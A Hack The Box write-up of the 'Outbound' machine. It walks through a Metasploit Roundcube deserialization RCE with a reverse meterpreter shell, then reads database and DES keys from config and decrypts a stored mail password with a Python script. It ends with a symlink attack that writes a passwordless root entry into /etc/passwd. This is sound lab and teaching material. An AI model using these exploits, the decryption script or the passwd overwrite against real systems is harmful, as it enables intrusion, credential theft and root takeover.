---
layout: post
title: "[HTB] Outbound"
description: "[Machine] - Easy difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---

![Outbound.png](/img/htb_img/Outbound_img/Outbound.png)

# Info

> tyler / LhKL1o9Nm3X2
> 

# Enumeration

## Nmap recon

```bash
❯ sudo nmap -p- --open --min-rate 1500 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 16:48 CEST
Initiating SYN Stealth Scan at 16:48
Scanning 10.129.xx.xx [65535 ports]
Discovered open port 22/tcp on 10.129.xx.xx
Discovered open port 80/tcp on 10.129.xx.xx
Completed SYN Stealth Scan at 16:49, 12.87s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.040s latency).
Scanned at 2025-07-13 16:48:57 CEST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
           Raw packets sent: 65548 (2.884MB) | Rcvd: 65535 (2.621MB)
```

Versions and services:

```bash
❯ nmap -p22,80 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 16:53 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds
```

A domain and subdomain were identified.

```bash
❯ echo "$target outbound.htb mail.outbound.htb" | sudo tee -a /etc/hosts
10.129.xx.xx outbound.htb mail.outbound.htb
```

This machine consists of 2 open ports, SSH on 22 and HTTP nginx 1.24 (Ubuntu) on port 80.

---

## TCP 80 - HTTP Nginx

![image.png](/img/htb_img/Outbound_img/image.png)

The service running on port 80 is a Roundcube webmail (The same as darkcorp).

```bash
❯ whatweb http://$target                                                     
http://10.129.xx.xx [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.xx.xx], RedirectLocation[http://mail.outbound.htb/], Title[302 Found], nginx[1.24.0]
http://mail.outbound.htb/ [200 OK] Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[roundcube_sessid], IP[10.129.xx.xx], JQuery, PasswordField[_pass], RoundCube, Script, Title[Roundcube Webmail :: Welcome to Roundcube Webmail], X-Frame-Options[sameorigin], nginx[1.24.0]
```

As we can see with the `whatweb` command, when entering the target on port 80 we are redirected to the domain previously found. Neither this tool nor wappalyzer can determine what roundcube version we are working with.
We got some credentials to begin with, the credentials of Tyler.

> tyler / LhKL1o9Nm3X2
> 

---

After logging in with the credentials to the webmail page, we can see that we have one contact: `jacob@mail.outbound.htb`.

![image.png](/img/htb_img/Outbound_img/image%201.png)

Clicking on `About` to see more information about this service, we can see that the version of this software is RoundCube 1.6.10.

![image.png](/img/htb_img/Outbound_img/image%202.png)

On our terminal we can run `searchsploit` to find possible exploits for this version, and we get a hit for a RCE exploit.

```bash
❯ searchsploit roundcube 1.6.10
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Roundcube 1.6.10 - Remote Code Execution (RCE)                                                                                                                                                       | multiple/webapps/52324.NA
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Reading this script we can realize that it’s a metasploit module, so we fire up this tool to search it directly and otherwise import it.

```bash
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

...
```

---

# Foothold

We fire up metasploit to execute this PoC.

```bash
msf6 > search roundcube

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  auxiliary/gather/roundcube_auth_file_read             2017-11-09       normal     No     Roundcube TimeZone Authenticated File Disclosure
   1  exploit/multi/http/roundcube_auth_rce_cve_2025_49113  2025-06-02       excellent  Yes    Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization
   2    \_ target: Linux Dropper                            .                .          .      .
   3    \_ target: Linux Command                            .                .          .      .
```

We select the exploit and configure its options.

```bash
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > exploit
[*] Started reverse TCP handler on 10.10.X.X:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10610
[+] The target appears to be vulnerable.
[*] Fetching CSRF token...
[+] Extracted token: QH7eelYirWAdWmg0L8boRFpp0Vu7nZfn
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Sending stage (3045380 bytes) to 10.129.xx.xx
[*] Meterpreter session 1 opened (10.10.X.X:4444 -> 10.129.xx.xx:33292) at 2025-07-13 19:01:53 +0200

meterpreter >
```

## Shell as www-data

So, we got a meterpreter session for this linux machine. We can execute `shell`.

```bash
meterpreter > shell
Process 88413 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@mail:/$ export TERM=xterm
export TERM=xterm
www-data@mail:/$ 
```

# Lateral Movement

As a direct test, I tried to change to the tyler username re-using the same password and it worked.

```bash
www-data@mail:/home$ su tyler
su tyler
Password: LhKL1o9Nm3X2

tyler@mail:/home$ 

tyler@mail:~$ ls -lah
ls -lah
total 28K
drwxr-x--- 1 tyler tyler 4.0K Jun  8 13:28 .
drwxr-xr-x 1 root  root  4.0K Jun  8 12:05 ..
lrwxrwxrwx 1 root  root     9 Jun  7 13:53 .bash_history -> /dev/null
-rw-r--r-- 1 tyler tyler  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 tyler tyler 3.7K Mar 31  2024 .bashrc
-rw-r--r-- 1 tyler tyler  807 Mar 31  2024 .profile
drwx------ 3 tyler tyler 4.0K Jul 13 09:05 mail
```

We don’t have a user.txt file but we have a folder about `mail` .

Nothing interesting there.

I searched for a bit between folders and found the roundcube config at `/var/www/html/roundcube/config`.

```bash
tyler@mail:/var/www/html/roundcube/config$ cat config.inc.php
cat config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

So we can check the mariaDB:

```bash
tyler@mail:/var/www/html/roundcube/config$ mysql -uroundcube -pRCDBPass2025
```

So, in the database we can get the following:

```bash
MariaDB [roundcube]> select user_id,username,preferences from users;
select user_id,username,preferences from users;
+---------+----------+-----------------------------------------------------------+
| user_id | username | preferences                                               |
+---------+----------+-----------------------------------------------------------+
|       1 | jacob    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | a:2:{s:11:"client_hash";s:16:"hzmBc0jKs2Y1CHBv";i:0;b:0;} |
+---------+----------+-----------------------------------------------------------+
3 rows in set (0.001 sec)
```

In the session table we can get the following:

```bash
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
```

Decoding the base64:

```bash
❯ cat base| base64 -d     
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";%                                                           
```

We have a credential for jacob: `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`.

```bash
user jacob:
password: s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
auth_secret: s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";
request_token: s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";
```

In the config file we got the des_key:

```bash
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

---

## Shell as jacob

With all this things we can create a script to decrypt the password.

```bash
from base64 import b64decode
from Crypto.Cipher import DES3

# --- Inputs ---
key = b'rcmail-!24ByteDESkey*Str' # 24-byte DES-EDE3 key

# Encrypted values (base64)
data = {
    'password': 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/',
    'auth_secret': 'DpYqv6maI9HxDL5GhcCd8JaQQW',
    'request_token': 'TIsOaABA1zHSXZOBpH6up5XFyayNRHaw'
}
def decrypt_des3_cbc(value, key):
    try:
        raw = b64decode(value)
        iv = raw[:8]
        cipher_text = raw[8:]
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        decrypted = cipher.decrypt(cipher_text)
        
        # Strip null bytes and last padding byte (mimics PHP rtrim + substr)
        decrypted = decrypted.rstrip(b'\x00')[:-1]
        return decrypted.decode(errors='replace')
    except Exception as e:
        return f"[ERROR] {e}"

# Decrypt all
for k, v in data.items():
    result = decrypt_des3_cbc(v, key)
    print(f"[+] Decrypted {k}: {result}")
```

```bash
❯ python3 decrypt.py 
[+] Decrypted password: 595mO8DmwGeD
[+] Decrypted auth_secret: [ERROR] Incorrect padding
[+] Decrypted request_token: 2n����	T#��6�
```

So, we have the credentials:

> jacob / 595mO8DmwGeD
> 

---

Jacob also has a folder `mail` at his home. Here we can read his inbox and get the following message:

```bash
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

We get another password for Jacob, `gY4Wr3a1evp4`.

It also says that we have permission to inspect some log files.

## Exiting container

Checking the ip, we see that we are on a container:

```bash
jacob@mail:~/mail/INBOX$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 0a:3b:0f:76:c2:d3 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Using the new credentials we can log in through SSH with jacob.

```bash
❯ ssh jacob@$target          
jacob@10.129.xx.xx's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jul 13 05:54:23 PM UTC 2025

  System load:  0.0               Processes:             269
  Usage of /:   77.9% of 6.73GB   Users logged in:       0
  Memory usage: 18%               IPv4 address for eth0: 10.129.xx.xx
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jul 13 11:45:07 2025 from 10.10.xx.xx
jacob@outbound:~$
```

### User flag

```bash
jacob@outbound:~$ cat user.txt
<REDACTED>
jacob@outbound:~$ 
```

---

# Privilege Escalation

Based on the email’s hint we go to check the logs. We have access to a folder called `Bellow`, as stated on the email.

```bash
jacob@outbound:/var/log/below$ ll
total 12
drwxrwxrwx  3 root  root   4096 Jul 13 11:48 ./
drwxrwxr-x 13 root  syslog 4096 Jul 13 06:47 ../
-rw-rw-rw-  1 jacob jacob    11 Jul 13 11:09 error_jacob.log
-rw-rw-rw-  1 root  root      0 Jul 13 11:48 error_root.log
drwxr-xr-x  2 root  root   4096 Jul 13 06:47 store/
```

The file error_root.log has -rw-rw-rw- permissions, which can be exploited via symlink attacks.

This command sequence demonstrates a **symbolic link (symlink) attack** designed to achieve privilege escalation by manipulating the **`/etc/passwd`** file through a symbolic link vulnerability. The attack exploits the ability to write to a log file location that can be symlinked to sensitive system files.

```bash
# Creates a fake passwd entry in a temporary file.
echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass
```

```bash
# Ensures the target log file doesn't exist already
rm -f /var/log/below/error_root.log
```

```bash
# Creates a symbolic link from the log to /etc/passwd
ln -s /etc/passwd /var/log/below/error_root.log
```

```bash
# Copies the malicious user entry to what appears to be a log file, but actually overwrites /etc/passwd due to the symlink.
cp /tmp/fakepass /var/log/below/error_root.log
```

```bash
# Compromised user
su pwn
```

So, executing all this:

```bash
jacob@outbound:/var/log/below$ echo 'pwn::0:0:pwn:/root:/bin/bash' > /tmp/fakepass
jacob@outbound:/var/log/below$ rm -f /var/log/below/error_root.log
jacob@outbound:/var/log/below$ ln -s /etc/passwd /var/log/below/error_root.log
jacob@outbound:/var/log/below$ cp /tmp/fakepass /var/log/below/error_root.log
jacob@outbound:/var/log/below$ su pwn
pwn@outbound:/var/log/below# id
uid=0(pwn) gid=0(root) groups=0(root)
pwn@outbound:/var/log/below# cat /root/root.txt
<REDACTED>
```

Pwned!!

---

---

---